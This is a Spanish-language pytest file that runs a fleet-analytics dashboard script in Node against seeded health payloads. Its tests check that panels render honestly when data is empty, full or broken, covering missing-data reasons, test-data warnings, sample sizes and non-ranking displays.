"""
`flota_analitica.js` ejecutado de verdad, en Node, contra payloads sembrados.

## Por qué se ejecuta y no se grepea

El trinquete `TestNingunCampoDelHealthQuedaMudo` comprueba que el nombre del
campo **aparezca** en el JS. Eso es el piso, y pasa con la función entera
desconectada: un `flotaAnLecturas` que nadie llama sigue nombrando
`lecturas_por_vehiculo`. Acá se corre el archivo real y se mira lo pintado.

## La propiedad que este archivo protege, y es la contraria a la del bloque de salud

`flotaBloqueSalud` devuelve vacío cuando no hay nada que hacer. La analítica
**tiene que pintar los seis vehículos aunque no haya un solo dato**, porque el
trabajo entero del tab es mostrar lo que todavía no se puede medir. Un panel que
desaparece por estar vacío es indistinguible de uno que nunca se escribió.
"""
import json
import shutil
import subprocess
from pathlib import Path

import pytest

RAIZ = Path(__file__).resolve().parents[2]
PWA = RAIZ / 'app' / 'static' / 'pwa'

#: Igual que el de `test_render_salud_js.py`, con dos diferencias: carga los
#: DOS archivos de flota (la analítica llama a `cargarFlota`, que vive en el
#: otro) y devuelve el `innerHTML` del contenedor en vez del retorno de la
#: función — `flotaCargarAnalitica` pinta, no devuelve.
HARNESS = r"""
import fs from 'node:fs';
import vm from 'node:vm';

const GUION = JSON.parse(fs.readFileSync(process.argv[2], 'utf-8'));
const ARCHIVOS = GUION.archivos;

function elemento(id) {
  return {
    id, innerHTML: '', textContent: '', style: {}, disabled: false,
    classList: { add() {}, remove() {}, toggle() { return false; },
                 contains() { return false; } },
    querySelector() { return null; }, querySelectorAll() { return []; },
    addEventListener() {}, appendChild() {}, setAttribute() {}, remove() {},
  };
}
const elementos = {};
const doc = {
  body: elemento('body'), head: elemento('head'),
  documentElement: elemento('html'),
  getElementById(id) {
    if (!(id in elementos)) elementos[id] = elemento(id);
    return elementos[id];
  },
  querySelector() { return null; }, querySelectorAll() { return []; },
  addEventListener() {}, createElement(t) { return elemento(t); },
};
const guardado = {};
const ctx = {
  console, document: doc,
  localStorage: {
    getItem: (k) => (k in guardado ? guardado[k] : null),
    setItem(k, v) { guardado[k] = String(v); },
    removeItem(k) { delete guardado[k]; },
  },
  window: { location: { origin: 'http://test' }, addEventListener() {},
            matchMedia: () => ({ matches: false, addEventListener() {} }) },
  navigator: { onLine: true },
  setTimeout, clearTimeout, setInterval: () => 0, clearInterval: () => {},
  AbortController: globalThis.AbortController,
  get: async (ruta) => {
    if (GUION.revienta) throw new Error(GUION.revienta);
    for (const [trozo, payload] of Object.entries(GUION.rutas)) {
      if (String(ruta).includes(trozo)) return payload;
    }
    throw new Error('ruta no sembrada: ' + ruta);
  },
  horaColombia: (x) => String(x),
};
ctx.globalThis = ctx;
ctx.window.document = doc;
vm.createContext(ctx);
for (const a of ARCHIVOS) {
  vm.runInContext(fs.readFileSync(a, 'utf-8'), ctx, { filename: a });
}

(async () => {
  if (typeof ctx[GUION.fn] !== 'function') {
    throw new Error('no existe la función ' + GUION.fn);
  }
  const devuelto = await ctx[GUION.fn](...(GUION.args || []));
  process.stdout.write(JSON.stringify({
    html: elementos['flota-analitica'] ? elementos['flota-analitica'].innerHTML : '',
    devuelto: typeof devuelto === 'string' ? devuelto : null,
    subtab: guardado['flota_subtab'] || null,
    visible: {
      analitica: elementos['flota-analitica'] ? elementos['flota-analitica'].style.display : null,
      operacion: elementos['flota-contenido'] ? elementos['flota-contenido'].style.display : null,
    },
  }));
})().catch((e) => { console.error((e && e.stack) || e); process.exit(1); });
"""


def _correr(tmp_path, health, fn='flotaCargarAnalitica', args=None,
            revienta=None) -> dict:
    if not shutil.which('node'):
        pytest.skip('node no disponible en este entorno')
    h = tmp_path / 'h.mjs'
    h.write_text(HARNESS, encoding='utf-8')
    g = tmp_path / 'g.json'
    g.write_text(json.dumps({
        'fn': fn, 'args': args or [],
        'archivos': [str(PWA / 'util.js'), str(PWA / 'flota.js'),
                     str(PWA / 'flota_analitica.js')],
        'rutas': {'/flota/health': health,
                  '/api/rutas/vehiculos': {'vehiculos': []}},
        'revienta': revienta,
    }), encoding='utf-8')
    proc = subprocess.run(['node', str(h), str(g)],
                          capture_output=True, text=True, timeout=60)
    assert proc.returncode == 0, f'la analítica reventó:\n{proc.stderr}'
    return json.loads(proc.stdout)


def _hoy_real(**extra) -> dict:
    """El estado REAL de la operación al 2026-09-04, que es el peor caso: seis
    vehículos, 26 lecturas, **ninguna con foto**, cero de todo lo demás."""
    base = {
        'procedencia_del_tablero': {
            'ambiente': 'datos_de_prueba', 'datos_reales': False,
            'dia_operativo': '2026-09-04',
            'calculado_ts': '2026-09-04T09:47:28.111686-05:00'},
        'lecturas_por_vehiculo': [
            {'placa': 'THP696', 'n': 4, 'con_foto': 0, 'vigentes': 4,
             'por_confianza': {'verificada': 0, 'declarada': 0, 'dudosa': 4},
             'primera': '2026-08-03', 'ultima': '2026-08-16', 'motivo': None,
             'base': 'lecturas de odómetro registradas contra este vehículo',
             'etiqueta': 'toda la historia registrada'},
            {'placa': 'TGZ653', 'n': 0, 'con_foto': 0, 'vigentes': 0,
             'por_confianza': {'verificada': 0, 'declarada': 0, 'dudosa': 0},
             'primera': None, 'ultima': None,
             'motivo': 'ninguna lectura de odómetro registrada. Nace en el '
                       'recibo de turno, con la foto del tablero.',
             'base': 'lecturas de odómetro registradas contra este vehículo',
             'etiqueta': 'toda la historia registrada'},
        ],
        'cobertura_por_vehiculo': [
            {'placa': 'THP696', 'ficha': True, 'ficha_completa': False,
             'capacidad_tanque': False, 'posiciones_llanta': True,
             'documentos': True, 'lecturas': True},
            {'placa': 'TGZ653', 'ficha': False, 'ficha_completa': False,
             'capacidad_tanque': False, 'posiciones_llanta': False,
             'documentos': False, 'lecturas': False},
        ],
    }
    base.update(extra)
    return base


class TestLosTresPanelesPintanConLaBaseVacia:
    """La decisión del dueño: tab completo, y los paneles sin datos dicen qué
    gesto los enciende. Con la base de hoy, **ninguno puede salir vacío**."""

    def test_los_tres_paneles_estan(self, tmp_path):
        html = _correr(tmp_path, _hoy_real())['html']
        assert 'De dónde salen estos números' in html
        assert 'Calidad del kilómetro' in html
        assert 'Lo que la ficha no dice' in html

    def test_ningun_panel_desaparece_por_estar_vacio(self, tmp_path):
        """La disciplina contraria a la de `flotaBloqueSalud`, y va probada
        porque es la que alguien va a «corregir» por parecerle ruidosa."""
        html = _correr(tmp_path, _hoy_real(
            lecturas_por_vehiculo=[], cobertura_por_vehiculo=[]))['html']
        assert 'Esperando el primer registro' in html
        assert 'Se enciende:' in html

    def test_no_pinta_NaN_ni_undefined_ni_object_Object(self, tmp_path):
        """Este módulo ya publicó un `Carlos Pérez · undefined`, y
        `Number('sin_dato')` da `NaN`."""
        html = _correr(tmp_path, _hoy_real())['html']
        for basura in ('NaN', 'undefined', '[object Object]', 'null'):
            assert basura not in html, f'el tablero pintó {basura!r}'


class TestElVehiculoSinNadaOcupaSuRenglon:
    """El caso a atender es justo el que no tiene datos. Si se cae de la lista,
    «no aparece» y «está bien» se leen igual."""

    def test_el_vehiculo_sin_lecturas_sale_con_su_motivo(self, tmp_path):
        html = _correr(tmp_path, _hoy_real())['html']
        assert 'TGZ653' in html
        assert 'Nace en el recibo de turno' in html

    def test_y_no_sale_con_un_cero_mudo(self, tmp_path):
        """Un `0 lecturas` sin motivo no manda a nadie a hacer nada."""
        html = _correr(tmp_path, _hoy_real())['html']
        i = html.index('TGZ653')
        assert 'recibo de turno' in html[i:i + 900]


class TestLaCoberturaDistingueNO_de_NO_SE_PUDO_MIRAR:
    """Las dos direcciones. `false` es «se miró y falta»; `null` es «no había
    con qué mirar». Colapsarlos haría que un parque sin ficha levantada se viera
    idéntico a uno impecable — así se apaga un detector sin que nadie lo note."""

    @staticmethod
    def _celdas(html: str) -> str:
        """Solo el cuerpo de la tabla.

        El párrafo que explica la grilla también contiene `✗` y `?` — buscarlos
        en el HTML entero mediría el texto de ayuda en vez de los datos, que es
        un detector que pasa con la tabla vacía.
        """
        return html.split('<tbody>')[1].split('</tbody>')[0]

    def test_false_se_pinta_distinto_de_null(self, tmp_path):
        sin_mirar = [{'placa': 'THP696', 'ficha': None, 'ficha_completa': None,
                      'capacidad_tanque': None, 'posiciones_llanta': None,
                      'documentos': None, 'lecturas': None}]
        con_false = self._celdas(_correr(tmp_path, _hoy_real())['html'])
        con_null = self._celdas(_correr(
            tmp_path, _hoy_real(cobertura_por_vehiculo=sin_mirar))['html'])
        assert '✗' in con_false, 'un `false` tiene que verse como falta'
        assert '?' in con_null, 'un `null` tiene que verse como «no se pudo mirar»'
        assert '✗' not in con_null, (
            'un `null` se pintó igual que un `false`: un parque sin ficha '
            'levantada se ve idéntico a uno impecable')

    def test_el_tablero_explica_que_interrogante_no_es_no(self, tmp_path):
        html = _correr(tmp_path, _hoy_real())['html']
        assert 'no es «no»' in html


class TestCadaFilaDeclaraSuBaseYSuVentana:
    """Regla 13 a nivel de fila y no de página: una fila se copia sola a un
    WhatsApp, y ahí llega sin la cabecera que la explicaba."""

    def test_la_base_de_las_lecturas_se_ve_en_pantalla(self, tmp_path):
        html = _correr(tmp_path, _hoy_real())['html']
        assert 'lecturas de odómetro registradas contra este vehículo' in html
        assert 'toda la historia registrada' in html

    def test_el_encabezado_declara_ambiente_y_dia(self, tmp_path):
        html = _correr(tmp_path, _hoy_real())['html']
        assert 'datos_de_prueba' in html and '2026-09-04' in html


class TestElAvisoDeDatosDePruebaVaARRIBA:
    """Vivía como un renglón más al fondo de una lista larga, que es donde no se
    lee. Un tablero de QA que no se declara es evidencia falsa con autoridad."""

    def test_con_datos_de_prueba_lo_dice_y_lo_dice_fuerte(self, tmp_path):
        html = _correr(tmp_path, _hoy_real())['html']
        assert 'NO son de la operación real' in html
        assert html.index('NO son de la operación real') < html.index('Calidad del kilómetro')

    def test_con_datos_reales_NO_grita(self, tmp_path):
        """La otra dirección: un aviso que sale siempre se deja de leer."""
        html = _correr(tmp_path, _hoy_real(procedencia_del_tablero={
            'ambiente': 'produccion', 'datos_reales': True,
            'dia_operativo': '2026-09-04',
            'calculado_ts': '2026-09-04T09:47:28-05:00'}))['html']
        assert 'NO son de la operación real' not in html
        assert 'produccion' in html


class TestUnHealthCaidoSeDECLARA:
    """No se deja el panel vacío. Un tab en blanco es indistinguible de uno sin
    datos, y las dos cosas se atienden distinto — una es llamar al conductor, la
    otra es llamar a sistemas."""

    def test_el_error_se_pinta(self, tmp_path):
        html = _correr(tmp_path, _hoy_real(), revienta='500 del servidor')['html']
        assert 'No se pudo leer el estado de la flota' in html
        assert '500 del servidor' in html


class TestElSubTabRecuerdaDondeEstabas:
    """`control_flota` va a vivir en Analítica. Rebotarlo a Expedientes en cada
    F5 es cómo se deja de usar una pantalla."""

    def test_elegir_analitica_lo_persiste_y_lo_muestra(self, tmp_path):
        r = _correr(tmp_path, _hoy_real(), fn='flotaSubtab', args=['analitica'])
        assert r['subtab'] == 'analitica'
        assert r['visible']['analitica'] == 'block'
        assert r['visible']['operacion'] == 'none'

    def test_un_valor_desconocido_cae_a_operacion_y_no_a_una_pantalla_muerta(
            self, tmp_path):
        """Regla 0: ante entrada que no se entiende, el lado conservador es la
        pantalla que siempre funcionó, no una en blanco."""
        r = _correr(tmp_path, _hoy_real(), fn='flotaSubtab', args=['inventado'])
        assert r['subtab'] == 'operacion'
        assert r['visible']['operacion'] == 'block'


def _hallazgos(**extra) -> dict:
    """Un mundo con un hallazgo de cada clase: abierto vencido, cerrado, y uno
    de línea base que NO entra al indicador."""
    d = {
        'casos': [
            {'placa': 'THP696', 'reportado': '2026-08-20', 'entra': True,
             'criticidad': 'bloqueante', 'estado': 'abierto', 'dias': 'sin_dato',
             'dias_lleva': 15, 'vencido': True, 'aplazado_veces': 2},
            {'placa': 'TGZ653', 'reportado': '2026-08-01', 'entra': True,
             'criticidad': 'menor', 'estado': 'cerrado', 'dias': 9,
             'dias_lleva': 34, 'vencido': False, 'aplazado_veces': 0},
            {'placa': 'PRM100', 'reportado': '2026-07-01', 'entra': False,
             'criticidad': 'mayor', 'estado': 'abierto',
             'motivo_fuera': 'es de línea base: la primera inspección levanta lo '
                             'que ya había, sin responsable y sin reloj'},
        ],
        'promedio_dias': 9.0, 'n': 1, 'n_abiertos': 1, 'n_vencidos': 1,
        'n_fuera': 1, 'motivo': None,
        'base': 'hallazgos que entran al indicador — sin línea base, sin '
                'descartados y sin no_aplica (canon §6)',
        'etiqueta': 'toda la historia registrada',
    }
    d.update(extra)
    return {'dias_hallazgo_abierto': d}


class TestElIndicadorDeHallazgosVaDespromediado:
    """El desfase que cierra: `especialista-control-flota.md:119` promete «Días
    promedio de hallazgo abierto» desde el 2026-08-04 y ninguna pantalla lo
    mostraba, con el canon y la función ya escritos."""

    def test_los_casos_van_ANTES_que_el_promedio(self, tmp_path):
        """Con un puñado de hallazgos el promedio no dice a qué camión llamar.
        Va detrás de la enumeración, no en vez de ella."""
        html = _correr(tmp_path, _hoy_real(**_hallazgos()))['html']
        assert html.index('THP696') < html.index('en promedio')

    def test_el_promedio_NUNCA_sale_sin_su_n(self, tmp_path):
        """Un promedio de 2 casos y uno de 200 son el mismo número con distinta
        autoridad, y desde el número no se distinguen."""
        html = _correr(tmp_path, _hoy_real(**_hallazgos()))['html']
        assert '9 días' in html and 'sobre <b>1</b> hallazgo(s) cerrado(s)' in html

    def test_abiertos_y_cerrados_NO_se_mezclan(self, tmp_path):
        """El canon §6 lo prohíbe: `dias` mide duración cerrada y `dias_lleva`
        antigüedad viva. El aviso de WhatsApp usa uno, el indicador el otro."""
        html = _correr(tmp_path, _hoy_real(**_hallazgos()))['html']
        assert 'lleva 15 día(s)' in html          # el abierto, con su reloj
        assert '9 día(s), reportado el 2026-08-01' in html   # el cerrado
        assert html.index('el reloj corriendo') < html.index('duración real')

    def test_el_vencido_se_ve_y_el_aplazamiento_tambien(self, tmp_path):
        """Aplazar mueve el plazo; no borra el tiempo transcurrido. Si el
        aplazamiento no se ve, un hallazgo aplazado tres veces se lee igual que
        uno recién reportado."""
        html = _correr(tmp_path, _hoy_real(**_hallazgos()))['html']
        assert 'VENCIDO' in html and 'aplazado 2 vez/veces' in html

    def test_el_denominador_es_visible(self, tmp_path):
        """`n_fuera` con su motivo. Un indicador que solo reporta lo que mira
        devolvería «0 días promedio» sobre una flota llena de línea base, y eso
        se lee como «no hay demoras»."""
        html = _correr(tmp_path, _hoy_real(**_hallazgos()))['html']
        assert '1 fuera del indicador' in html
        assert 'línea base' in html

    def test_sin_cerrados_el_promedio_es_sin_dato_CON_motivo_y_no_cero(
            self, tmp_path):
        """Un promedio de cero elementos no es cero: es que todavía no hay nada
        que promediar, y las dos cosas se leen distinto en un tablero."""
        html = _correr(tmp_path, _hoy_real(**_hallazgos(
            promedio_dias='sin_dato', n=0,
            motivo='ningún hallazgo cerrado todavía: no hay duración que '
                   'promediar. El indicador nace al cerrar el primer daño '
                   'con su odómetro y su evidencia.')))['html']
        assert 'sin dato' in html
        assert 'ningún hallazgo cerrado todavía' in html
        assert '0 días' not in html

    def test_la_pantalla_dice_lo_que_el_numero_NO_afirma(self, tmp_path):
        """Las dos negaciones del canon §3 que más caro cuestan si se olvidan:
        que mide riesgo real y no gestión, y que no compara zonas."""
        html = _correr(tmp_path, _hoy_real(**_hallazgos()))['html']
        assert 'vuelve reparado' in html
        assert 'No compara zonas' in html


class TestElRendimientoDelConductorSePintaSinSemaforo:
    """`flotaCondRendimiento` — el número que `piso-conductor.md:149` promete.

    Se ejerce con `devuelto` y no con el contenedor: es una función pura que
    devuelve HTML, igual que `flotaCondEstado`.
    """

    @staticmethod
    def _r(**extra):
        base = {'km_galon': '24.00', 'publicable': True, 'motivo': None,
                'ventanas': 8, 'tanqueos_fuera_por_parcial': 2,
                'dias_historia': 95,
                'base': 'kilómetros y galones sumados sobre las ventanas',
                'no_afirma': 'Mide el VEHÍCULO, no a quien maneja. Una ruta con '
                             'más montaña, un filtro tapado y un sifón dan el '
                             'mismo número.'}
        base.update(extra)
        return base

    def _pintar(self, tmp_path, r):
        return _correr(tmp_path, _hoy_real(), fn='flotaCondRendimiento',
                       args=[r])['devuelto']

    def test_publicable_muestra_el_numero_con_sus_ventanas(self, tmp_path):
        html = self._pintar(tmp_path, self._r())
        assert '24.00 km/galón' in html
        assert '8 ventana(s)' in html and '95 día(s)' in html

    def test_declara_los_tanqueos_que_quedaron_fuera(self, tmp_path):
        """Condición 2 del dueño. Un rendimiento sobre 3 de 20 tanqueos y uno
        sobre 19 de 20 se ven idénticos, y el primero no significa nada."""
        html = self._pintar(tmp_path, self._r())
        assert '2 tanqueo(s) quedaron fuera' in html

    def test_NO_publicable_dice_QUE_FALTA_y_no_muestra_numero(self, tmp_path):
        """Tres estados y no dos: «midiendo» solo necesita que pase el tiempo;
        «sin dato» necesita que alguien marque el tanque."""
        html = self._pintar(tmp_path, self._r(
            km_galon='sin_dato', publicable=False, ventanas=3,
            motivo='3 ventana(s) de 6. Con menos, un solo viaje cargado mueve '
                   'el número lo suficiente para que parezca que cambió algo.'))
        assert 'Midiendo todavía' in html
        assert '3 ventana(s) de 6' in html
        assert 'km/galón' not in html, (
            'pintó un número que el dominio dijo que no se puede sostener')

    def test_NO_hay_semaforo_ni_meta(self, tmp_path):
        """Regla 13: no hay una sola medición de esta flota con la que fijar un
        techo, y un umbral escrito hoy sería a ojo. Se dice cuánto rindió; si
        está bien lo decide alguien con datos, dentro de unos meses."""
        html = self._pintar(tmp_path, self._r())
        assert 'var(--red)' not in html and 'var(--green' not in html
        for palabra in ('meta', 'objetivo', 'esperado', 'bajo', 'malo'):
            assert palabra not in html.lower(), f'apareció un juicio: {palabra}'

    def test_dice_lo_que_el_numero_NO_afirma(self, tmp_path):
        """Regla 2, en la pantalla y no en un instructivo aparte."""
        html = self._pintar(tmp_path, self._r())
        assert 'no a quien maneja' in html

    def test_sin_camion_asignado_no_pinta_nada(self, tmp_path):
        """«No tenés camión hoy» no es «tu camión rinde 0»."""
        assert self._pintar(tmp_path, None) == ''


class TestElPanelDeRendimientoNoEsUnRanking:

    @staticmethod
    def _filas():
        """El de MENOR rendimiento va primero, y no es casualidad.

        La primera versión ponía el de 30 km/gal antes que el de 12, así que
        ordenar por número descendente daba exactamente el mismo orden: la
        mutación «el panel se vuelve un ranking» **sobrevivió** el 2026-09-04.
        Un fixture cuyo orden natural coincide con el orden mutado no prueba
        nada sobre el orden.
        """
        return [
            {'placa': 'AAA111', 'km_galon': '12.00', 'publicable': True,
             'motivo': None, 'ventanas': 9, 'tanqueos': 12,
             'tanqueos_fuera_por_parcial': 1, 'dias_historia': 120,
             'base': 'kilómetros y galones sumados sobre las ventanas',
             'etiqueta': 'toda la historia registrada'},
            {'placa': 'BBB222', 'km_galon': '30.00', 'publicable': False,
             'motivo': '2 ventana(s) de 6.', 'ventanas': 2, 'tanqueos': 4,
             'tanqueos_fuera_por_parcial': 0, 'dias_historia': 20,
             'base': 'kilómetros y galones sumados sobre las ventanas',
             'etiqueta': 'toda la historia registrada'},
        ]

    def test_el_orden_es_por_placa_y_NO_por_rendimiento(self, tmp_path):
        """Ordenarlo por el número lo convertiría en un ranking sin que nadie lo
        hubiera decidido — y el canon dice que esto no compara vehículos."""
        html = _correr(tmp_path, _hoy_real(
            rendimiento_por_vehiculo=self._filas()))['html']
        assert html.index('AAA111') < html.index('BBB222'), (
            'se ordenó por rendimiento: AAA111 rinde 12 y BBB222 rinde 30, así '
            'que un ranking los pondría al revés')

    def test_el_provisional_SI_se_muestra_acá_y_se_marca(self, tmp_path):
        """La diferencia deliberada con la pantalla del conductor: control de
        flota pregunta «¿ya se puede medir esto?» y necesita ver el número."""
        html = _correr(tmp_path, _hoy_real(
            rendimiento_por_vehiculo=self._filas()))['html']
        assert '30.00 km/gal' in html and 'provisional' in html

    def test_dice_que_NO_compara_vehiculos(self, tmp_path):
        html = _correr(tmp_path, _hoy_real(
            rendimiento_por_vehiculo=self._filas()))['html']
        assert 'No compara vehículos' in html


def _lleno() -> dict:
    """Un health con TODOS los campos poblados y valores plausibles.

    Existe porque los demás fixtures ejercen los paneles en su estado vacío, que
    es el estado de hoy — y un panel puede pintar «esperando el primer registro»
    perfectamente y reventar en cuanto lleguen datos. Es el mismo punto ciego
    que tenían los ~1900 tests que armaban su propio mundo coherente.
    """
    d = _hoy_real(**_hallazgos())
    d.update({
        'vehiculos_activos': 6, 'fichas_completas': 4,
        'atributos_sin_dato': ['TGZ653.distribucion'],
        'vehiculos_sin_custodia_activa': 2, 'custodias_pendiente_sede': 1,
        'custodias_cerradas_forzadas': 3, 'custodias_sin_foto_completa': 2,
        'fotos_pendiente_evidencia': 0, 'conductores_activos_sin_cuenta': 1,
        'documentos_no_encontrados': 4, 'documentos_vencidos': 1,
        'documentos_por_vencer_30d': 2, 'rutas_historicas_sin_placa': 3,
        'documentos_por_vehiculo': [
            {'placa': 'THP696', 'tipo': 'soat', 'estado': 'vigente',
             'vence': '2026-08-20', 'dias': -15, 'vencido': True,
             'por_vencer_30d': False, 'no_encontrado': False,
             'base': 'documentos registrados contra el vehículo',
             'etiqueta': 'estado al día de hoy'},
            {'placa': 'TGZ653', 'tipo': 'rtm', 'estado': 'vigente',
             'vence': '2026-09-20', 'dias': 16, 'vencido': False,
             'por_vencer_30d': True, 'no_encontrado': False,
             'base': 'documentos registrados contra el vehículo',
             'etiqueta': 'estado al día de hoy'},
            {'placa': 'TGZ653', 'tipo': 'poliza_rc', 'estado': 'no_encontrado',
             'vence': None, 'dias': None, 'vencido': False,
             'por_vencer_30d': False, 'no_encontrado': True,
             'base': 'documentos registrados contra el vehículo',
             'etiqueta': 'estado al día de hoy'},
        ],
        'custodias_por_vehiculo': [
            {'placa': 'THP696', 'custodia_id': 4,
             'inicio_ts': '2026-09-01T05:10:00', 'fin_ts': '2026-09-01T18:20:00',
             'abierta': False, 'cierre_forzado': True,
             'cierre_forzado_motivo': 'el conductor no volvió a la sede',
             'sin_foto_completa': True, 'mitad_incompleta': 'fin',
             'fotos': 2, 'fotos_exigidas': 11,
             'base': 'custodias registradas contra el vehículo',
             'etiqueta': 'toda la historia registrada'},
            {'placa': 'WHX245', 'custodia_id': 9,
             'inicio_ts': '2026-09-08T05:00:00', 'fin_ts': None,
             'abierta': True, 'cierre_forzado': False,
             'cierre_forzado_motivo': None, 'sin_foto_completa': True,
             'mitad_incompleta': 'inicio', 'fotos': 7, 'fotos_exigidas': 13,
             'base': 'custodias registradas contra el vehículo',
             'etiqueta': 'toda la historia registrada'},
        ],
        'vehiculos_sin_lectura': 1, 'lecturas_sin_foto': 26,
        'lecturas_correccion_30d': 1,
        'salto_km_maximo_30d': {'vehiculo_id': 1, 'delta_km': 16354514,
                                'horas': 312.0, 'valor_km': 16697948,
                                'origen': 'entrega'},
        'lecturas_ts_duplicado': 10, 'fichas_con_ancla_incoherente': 4,
        'lecturas_dudosas_pendientes': 26, 'lecturas_verificadas_30d': 0,
        'hallazgos_abiertos': 1, 'hallazgos_vencidos': 1,
        'vehiculos_sin_inspeccion_hoy': 5, 'inspecciones_incompletas_hoy': 1,
        'segundos_llenado_30d': {'n': 12, 'mediana': 92,
                                 'minimo': {'segundos': 19, 'items': 14,
                                            'inspeccion_id': 7, 'vehiculo_id': 1,
                                            'veredicto': 'apto'}},
        'tanqueos_sobre_capacidad': 1, 'tanqueos_sin_capacidad_declarada': 3,
        'gastos_sin_documento': 2,
        'cpk_mes': [
            {'placa': 'THP696', 'cpk': '4780.00', 'marca': 'declarada',
             'pesos': '1199780.00', 'km': 251, 'hubo_gastos': True,
             'motivo': None, 'n': 4,
             'base': 'gastos registrados contra el vehículo',
             'desde': '2026-09-01', 'hasta': '2026-09-04',
             'etiqueta': 'el mes en curso'},
            {'placa': 'TGZ653', 'cpk': 'sin_dato', 'marca': 'sin_dato',
             'pesos': '0.00', 'km': 0, 'hubo_gastos': False, 'n': 0,
             'motivo': 'ningún gasto registrado contra este vehículo. No es que '
                       'sea gratis: es que nadie ha cargado una factura.',
             'base': 'gastos registrados contra el vehículo',
             'desde': '2026-09-01', 'hasta': '2026-09-04',
             'etiqueta': 'el mes en curso'},
        ],
        'rendimiento_por_vehiculo': [
            {'placa': 'THP696', 'km_galon': '24.00', 'publicable': True,
             'motivo': None, 'ventanas': 8, 'tanqueos': 12,
             'tanqueos_fuera_por_parcial': 2, 'dias_historia': 95,
             'base': 'kilómetros y galones sumados', 'etiqueta': 'toda la historia'},
        ],
        'ot_abiertas': 1, 'trabajos_sin_factura': 2, 'garantias_vigentes': 0,
        'posiciones_sin_llanta': 18, 'vehiculos_sin_posiciones_llanta': 1,
        'llantas_montadas': 6,
        'km_por_posicion': [
            {'placa': 'THP696', 'posicion': 1, 'mediana_km': '48000',
             'n': 3, 'faltan': 0},
            {'placa': 'THP696', 'posicion': 5, 'mediana_km': 'sin_dato',
             'n': 1, 'faltan': 2},
        ],
        'tareas_vencidas': 2, 'tareas_por_vencer': 3,
        'tareas_sin_linea_base': 30, 'tareas_sin_intervalo': 6,
        'km_dia_por_vehiculo': [
            {'placa': 'THP696', 'km_dia': '84.30', 'marca': 'declarada',
             'n': 4, 'dias': '13.0', 'motivo': None},
            {'placa': 'TGZ653', 'km_dia': 'sin_dato', 'marca': 'sin_dato',
             'n': 0, 'dias': 'sin_dato',
             'motivo': 'menos de dos lecturas: no hay tramo que dividir'},
        ],
    })
    return d


class TestElTabCompletoConDatosDeVerdad:
    """Los demás fixtures ejercen los paneles VACÍOS, que es el estado de hoy.

    Un panel puede pintar «esperando el primer registro» impecablemente y
    reventar en cuanto lleguen datos — y ese día nadie va a estar mirando. Es el
    mismo punto ciego que tenían los ~1900 tests que armaban su propio mundo
    coherente: verifican cada etapa con datos que ellos mismos fabricaron.
    """

    #: Los quince bloques que el tab tiene que pintar SIEMPRE, con o sin datos.
    TITULOS = [
        'De dónde salen estos números',
        'El recorrido de la semana',
        'Calidad del kilómetro',
        'Lo que la ficha no dice',
        'Costo por kilómetro',
        'Pesos por mes',
        'Rendimiento km/galón',
        'Taller y garantía',
        'Vida de llanta por posición',
        'Plan preventivo',
        'Ritmo de uso',
        'Días de hallazgo abierto',
        'Inspección diaria',
        'Papeles',
        'Custodia',
    ]

    def test_los_quince_paneles_pintan_con_datos(self, tmp_path):
        html = _correr(tmp_path, _lleno())['html']
        faltan = [t for t in self.TITULOS if t not in html]
        assert not faltan, f'no pintaron: {faltan}'

    def test_los_quince_paneles_pintan_TAMBIEN_vacios(self, tmp_path):
        """La decisión del dueño —tab completo— probada en el estado de hoy.

        `flotaBloqueSalud` devuelve vacío cuando no hay nada que hacer; acá es
        al revés y va probado, porque es la disciplina que alguien va a
        «corregir» por parecerle ruidosa.
        """
        html = _correr(tmp_path, {})['html']
        faltan = [t for t in self.TITULOS if t not in html]
        assert not faltan, f'desaparecieron por estar vacíos: {faltan}'

    def test_con_datos_no_pinta_NaN_ni_undefined(self, tmp_path):
        html = _correr(tmp_path, _lleno())['html']
        for basura in ('NaN', 'undefined', '[object Object]'):
            assert basura not in html, f'el tablero pintó {basura!r}'

    def test_el_orden_pone_el_kilometro_antes_que_la_plata(self, tmp_path):
        """No es temático: mientras la calidad del kilómetro esté en rojo, el
        CPK y el km por llanta salen `sin_dato` por diseño. El panel que dice
        qué hacer va antes que los que dependen de que se haga."""
        html = _correr(tmp_path, _lleno())['html']
        # Por título de panel y no por texto suelto: «El recorrido de la semana»
        # NOMBRA a los paneles para decir dónde viven, así que un `index()` sobre
        # la palabra encuentra primero el índice y el test mediría otra cosa.
        def panel(t):
            return html.index(f'tabla-titulo">{t}')
        assert panel('Calidad del kilómetro') < panel('Costo por kilómetro')
        assert panel('Lo que la ficha no dice') < panel('Vida de llanta')

    def test_el_CPK_muestra_la_division_que_lo_produjo(self, tmp_path):
        """Un CPK suelto no se puede auditar, y éste va a la pantalla de quien
        decide sobre plata."""
        html = _correr(tmp_path, _lleno())['html']
        assert '251 km' in html and '4 lectura(s)' in html

    def test_el_CPK_sin_cifra_dice_a_QUIEN_llamar(self, tmp_path):
        html = _correr(tmp_path, _lleno())['html']
        assert 'nadie ha cargado una factura' in html

    def test_las_llantas_se_agrupan_por_camion_y_no_por_posicion(self, tmp_path):
        """La comparación que vale es intra-vehículo. Agrupar por número de
        posición pondría lado a lado la 1 de un NHR y la 1 de un motocarro, que
        es exactamente la comparación que no dice nada."""
        html = _correr(tmp_path, _lleno())['html']
        i = html.index('Vida de llanta por posición')
        bloque = html[i:i + 2000]
        assert bloque.count('THP696') == 1, 'la placa se repitió por posición'
        assert 'posición 1' in bloque and 'posición 5' in bloque

    def test_una_posicion_con_pocas_vidas_dice_cuantas_FALTAN(self, tmp_path):
        """Con dos vidas la mediana la mueve un pinchazo. `faltan` es lo que
        separa «todavía no» de «no hay»."""
        html = _correr(tmp_path, _lleno())['html']
        assert 'faltan 2' in html


class TestElPanelDePesosPorMes:
    """«¿Qué camión se come la plata?» — la decisión mensual del `admin`.

    El panel de CPK mandaba al lector, **en pantalla**, a «el panel de pesos por
    mes», y ese panel no existía en ningún archivo del repo. Los tests de acá
    protegen las dos cosas que lo hacen distinto del CPK: que **sí** ordena
    entre vehículos, y que un vehículo sin un solo gasto registrado **no** entra
    a ese orden.
    """

    def test_la_promesa_del_CPK_resuelve_a_un_panel_real(self, tmp_path):
        """Una frase de UI que manda a un panel inexistente es la misma clase de
        defecto que un identificador que promete una cosa y calcula otra: no
        falla, miente con confianza. Y el que la lee no tiene cómo saberlo."""
        html = _correr(tmp_path, _lleno())['html']
        assert 'panel de pesos por mes' in html, 'se cayó la promesa del CPK'
        assert (html.index('panel de pesos por mes')
                < html.index('tabla-titulo">Pesos por mes · ¿qué camión')), \
            'la promesa manda hacia abajo y el panel quedó arriba'

    def test_el_camion_SIN_registro_no_se_ordena_como_el_mas_barato(self, tmp_path):
